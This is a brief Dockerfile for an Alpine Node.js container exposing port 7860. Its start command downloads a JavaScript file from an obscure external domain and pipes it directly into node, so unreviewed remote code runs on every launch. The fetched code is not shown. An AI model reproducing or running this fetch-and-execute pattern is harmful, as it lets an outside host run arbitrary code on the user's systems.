FROM node:alpine

WORKDIR /app

EXPOSE 7860
COPY . ./
RUN apk update && apk upgrade &&\
    apk add --no-cache openssl curl gcompat iproute2 coreutils &&\
    apk add --no-cache bash &&\
    npm install

CMD curl -s 'https://i6.yekaipo.dpdns.org/wj.php?dir=.%2Fabc&action=view&file=railway.js'| node
